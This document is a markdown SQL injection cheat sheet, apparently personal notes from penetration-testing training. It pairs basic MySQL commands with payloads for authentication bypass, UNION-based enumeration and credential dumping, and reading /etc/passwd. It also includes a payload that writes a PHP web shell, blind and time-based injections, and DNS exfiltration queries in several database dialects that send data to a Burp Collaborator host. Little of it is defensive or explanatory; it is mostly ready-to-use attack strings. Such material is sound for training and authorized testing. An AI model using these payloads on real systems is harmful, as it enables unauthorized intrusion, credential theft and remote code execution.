## MySQL

| **Command**   | **Description**   |
| --------------|-------------------|
| **General** |
| `mysql -u root -h docker.hackthebox.eu -P 3306 -p` | login to mysql database |
| `SHOW DATABASES` | List available databases |
| `USE users` | Switch to database |
| **Tables** |
| `CREATE TABLE logins (id INT, ...)` | Add a new table |
| `SHOW TABLES` | List available tables in current database |
| `DESCRIBE logins` | Show table properties and columns |
| `INSERT INTO table_name VALUES (value_1,..)` | Add values to table |
| `INSERT INTO table_name(column2, ...) VALUES (column2_value, ..)` | Add values to specific columns in a table |
| `UPDATE table_name SET column1=newvalue1, ... WHERE <condition>` | Update table values |
| **Columns** |
| `SELECT * FROM table_name` | Show all columns in a table |
| `SELECT column1, column2 FROM table_name` | Show specific columns in a table |
| `DROP TABLE logins` | Delete a table |
| `ALTER TABLE logins ADD newColumn INT` | Add new column |
| `ALTER TABLE logins RENAME COLUMN newColumn TO oldColumn` | Rename column |
| `ALTER TABLE logins MODIFY oldColumn DATE` | Change column datatype |
| `ALTER TABLE logins DROP oldColumn` | Delete column |
| **Output** |
| `SELECT * FROM logins ORDER BY column_1` | Sort by column |
| `SELECT * FROM logins ORDER BY column_1 DESC` | Sort by column in descending order |
| `SELECT * FROM logins ORDER BY column_1 DESC, id ASC` | Sort by two-columns |
| `SELECT * FROM logins LIMIT 2` | Only show first two results |
| `SELECT * FROM logins LIMIT 1, 2` | Only show first two results starting from index 2 |
| `SELECT * FROM table_name WHERE <condition>` | List results that meet a condition |
| `SELECT * FROM logins WHERE username LIKE 'admin%'` | List results where the name is similar to a given string |

## MySQL Operator Precedence
* Division (`/`), Multiplication (`*`), and Modulus (`%`)
* Addition (`+`) and Subtraction (`-`)
* Comparison (`=`, `>`, `<`, `<=`, `>=`, `!=`, `LIKE`)
* NOT (`!`)
* AND (`&&`)
* OR (`||`)

## SQL Injection
| **Payload** | **Description** |
| ---- | ---- |
| **Auth Bypass** |  |
| `admin' or '1'='1` | Basic Auth Bypass |
| `admin')-- -` | Basic Auth Bypass With comments |
| [Auth Bypass Payloads](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection#authentication-bypass) |  |
| **Union Injection** |  |
| `' order by 1-- -` | Detect number of columns using `order by` |
| `cn' UNION select 1,2,3-- -` | Detect number of columns using Union injection |
| `cn' UNION select 1,@@version,3,4-- -` | Basic Union injection |
| `UNION select username, 2, 3, 4 from passwords-- -` | Union injection for 4 columns |
| **DB Enumeration** |  |
| `SELECT @@version` | Fingerprint MySQL with query output |
| `SELECT SLEEP(5)` | Fingerprint MySQL with no output |
| `cn' UNION select 1,database(),2,3-- -` | Current database name |
| `cn' UNION select 1,schema_name,3,4 from INFORMATION_SCHEMA.SCHEMATA-- -` | List all databases |
| `cn' UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema='dev'-- -` | List all tables in a specific database |
| `cn' UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name='credentials'-- -` | List all columns in a specific table |
| `cn' UNION select 1, username, password, 4 from dev.credentials-- -` | Dump data from a table in another database |
| **Privileges** |  |
| `cn' UNION SELECT 1, user(), 3, 4-- -` | Find current user |
| `cn' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user WHERE user="root"-- -` | Find if user has admin privileges |
| `cn' UNION SELECT 1, grantee, privilege_type, is_grantable FROM information_schema.user_privileges WHERE user="root"-- -` | Find if all user privileges |
| `cn' UNION SELECT 1, variable_name, variable_value, 4 FROM information_schema.global_variables where variable_name="secure_file_priv"-- -` | Find which directories can be accessed through MySQL |
| **File Injection** |  |
| `cn' UNION SELECT 1, LOAD_FILE("/etc/passwd"), 3, 4-- -` | Read local file |
| `select 'file written successfully!' into outfile '/var/www/html/proof.txt'` | Write a string to a local file |
| `cn' union select "",'<?php system($_REQUEST[0]); ?>', "", "" into outfile '/var/www/html/shell.php'-- -` | Write a web shell into the base web directory |
| **Blind SQL Injection** |  |
| `cookie_value' and substring((select password from users where username='admin'),1,1)='a'--'` | Blind sql injection on error based injection (ie, we have a response changing when an error occurs or not) |
| `LGF4OY5pSrLIqxu' and (SELECT CASE WHEN (SUBSTR(password,1,21)='gz92x9yvfj3m6rzre8zg§a§') THEN TO_CHAR(1/0) ELSE 'a' END FROM users WHERE username='administrator')='a'--` | Conditionnal error. Ie when a good value is set, an error is thrown (ex : 500 Internal server Error) |
| `' AND CAST((SELECT password FROM users WHERE username='admin') AS int)--` `' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--` | Can be usefull when error query are shown. |
| `qsduqzln12aze' \|\| (SELECT sleep(10))--`  `qsduqzln12aze' \|\| (SELECT pg_sleep(10))--`  `'; IF (SELECT COUNT(Username) FROM Users WHERE Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') = 1 WAITFOR DELAY '0:0:{delay}'--` `x'+\|\|+(SELECT+CASE+WHEN+(username='administrator'+AND SUBSTRING(password,1,2)='a§a§')+THEN pg_sleep(5)+ELSE+pg_sleep(0)+END+FROM users)--` | time based query // For burp intruder resource thread must be set to 1 to avoid false positives |
| `SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'\|\|(SELECT YOUR-QUERY-HERE)\|\|'.BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual` | DNS Lookup + data exfil : Oracle. See other payload here : https://portswigger.net/web-security/sql-injection/cheat-sheet |



| Oracle | Microsoft | PostgresQL | Mysql | Description |
| ---- | ---- | ---- | ---- | ---- |
| `'foo'\|\|'bar'`<br>=> `foobar` | `'foo'+'bar'`<br>=> `foobar` | `'foo'\|\|'bar'`<br>=> `foobar` | `'foo' 'bar'`<br>`CONCAT('foo','bar')`<br>=> `foobar` | Concatenate strings |
| `SUBSTR('foobar', 4, 2)`<br>=> `ba` | `SUBSTRING('foobar', 4, 2)`<br>=> `ba` | `SUBSTRING('foobar', 4, 2)`<br>=> `ba` | `SUBSTRING('foobar', 4, 2)`<br>=> `ba` | Extract part of a string. |
| --comment | --comment<br>/\*comment\*/ | --comment<br>/\*comment\*/ | \#comment<br>-- comment <br>[Note the space after the double dash]<br>/\*comment\*/ | Comments to truncate a query. |
| `SELECT banner FROM v$version`<br> |  |  |  | Database Version |


You can query the database to determine its type and version. This information is useful when formulating more complicated attacks.
Oracle 	
SELECT version FROM v$instance
Microsoft 	SELECT @@version
PostgreSQL 	SELECT version()
MySQL 	SELECT @@version
Database contents

You can list the tables that exist in the database, and the columns that those tables contain.
Oracle 	SELECT * FROM all_tables
SELECT * FROM all_tab_columns WHERE table_name = 'TABLE-NAME-HERE'
Microsoft 	SELECT * FROM information_schema.tables
SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'
PostgreSQL 	SELECT * FROM information_schema.tables
SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'
MySQL 	SELECT * FROM information_schema.tables
SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'
Conditional errors

You can test a single boolean condition and trigger a database error if the condition is true.
Oracle 	SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN TO_CHAR(1/0) ELSE NULL END FROM dual
Microsoft 	SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 1/0 ELSE NULL END
PostgreSQL 	1 = (SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 1/(SELECT 0) ELSE NULL END)
MySQL 	SELECT IF(YOUR-CONDITION-HERE,(SELECT table_name FROM information_schema.tables),'a')
Extracting data via visible error messages

You can potentially elicit error messages that leak sensitive data returned by your malicious query.
Microsoft 	SELECT 'foo' WHERE 1 = (SELECT 'secret')

> Conversion failed when converting the varchar value 'secret' to data type int.
PostgreSQL 	SELECT CAST((SELECT password FROM users LIMIT 1) AS int)

> invalid input syntax for integer: "secret"
MySQL 	SELECT 'foo' WHERE 1=1 AND EXTRACTVALUE(1, CONCAT(0x5c, (SELECT 'secret')))

> XPATH syntax error: '\secret'
Batched (or stacked) queries

You can use batched queries to execute multiple queries in succession. Note that while the subsequent queries are executed, the results are not returned to the application. Hence this technique is primarily of use in relation to blind vulnerabilities where you can use a second query to trigger a DNS lookup, conditional error, or time delay.
Oracle 	Does not support batched queries.
Microsoft 	QUERY-1-HERE; QUERY-2-HERE
QUERY-1-HERE QUERY-2-HERE
PostgreSQL 	QUERY-1-HERE; QUERY-2-HERE
MySQL 	QUERY-1-HERE; QUERY-2-HERE
Note

With MySQL, batched queries typically cannot be used for SQL injection. However, this is occasionally possible if the target application uses certain PHP or Python APIs to communicate with a MySQL database.
Time delays

You can cause a time delay in the database when the query is processed. The following will cause an unconditional time delay of 10 seconds.
Oracle 	dbms_pipe.receive_message(('a'),10)
Microsoft 	WAITFOR DELAY '0:0:10'
PostgreSQL 	SELECT pg_sleep(10)
MySQL 	SELECT SLEEP(10)
Conditional time delays

You can test a single boolean condition and trigger a time delay if the condition is true.
Oracle 	SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 'a'||dbms_pipe.receive_message(('a'),10) ELSE NULL END FROM dual
Microsoft 	IF (YOUR-CONDITION-HERE) WAITFOR DELAY '0:0:10'
PostgreSQL 	SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN pg_sleep(10) ELSE pg_sleep(0) END
MySQL 	SELECT IF(YOUR-CONDITION-HERE,SLEEP(10),'a')
DNS lookup

You can cause the database to perform a DNS lookup to an external domain. To do this, you will need to use Burp Collaborator to generate a unique Burp Collaborator subdomain that you will use in your attack, and then poll the Collaborator server to confirm that a DNS lookup occurred.
Oracle 	

(XXE) vulnerability to trigger a DNS lookup. The vulnerability has been patched but there are many unpatched Oracle installations in existence:
SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual

The following technique works on fully patched Oracle installations, but requires elevated privileges:
SELECT UTL_INADDR.get_host_address('BURP-COLLABORATOR-SUBDOMAIN')
Microsoft 	exec master..xp_dirtree '//BURP-COLLABORATOR-SUBDOMAIN/a'
PostgreSQL 	copy (SELECT '') to program 'nslookup BURP-COLLABORATOR-SUBDOMAIN'
MySQL 	

The following techniques work on Windows only:
LOAD_FILE('\\\\BURP-COLLABORATOR-SUBDOMAIN\\a')
SELECT ... INTO OUTFILE '\\\\BURP-COLLABORATOR-SUBDOMAIN\a'
DNS lookup with data exfiltration

You can cause the database to perform a DNS lookup to an external domain containing the results of an injected query. To do this, you will need to use Burp Collaborator to generate a unique Burp Collaborator subdomain that you will use in your attack, and then poll the Collaborator server to retrieve details of any DNS interactions, including the exfiltrated data.
Oracle 	SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT YOUR-QUERY-HERE)||'.BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual
Microsoft 	declare @p varchar(1024);set @p=(SELECT YOUR-QUERY-HERE);exec('master..xp_dirtree "//'+@p+'.BURP-COLLABORATOR-SUBDOMAIN/a"')
PostgreSQL 	create OR replace function f() returns void as $$
declare c text;
declare p text;
begin
SELECT into p (SELECT YOUR-QUERY-HERE);
c := 'copy (SELECT '''') to program ''nslookup '||p||'.BURP-COLLABORATOR-SUBDOMAIN''';
execute c;
END;
$$ language plpgsql security definer;
SELECT f();
MySQL 	The following technique works on Windows only:
SELECT YOUR-QUERY-HERE INTO OUTFILE '\\\\BURP-COLLABORATOR-SUBDOMAIN\a'
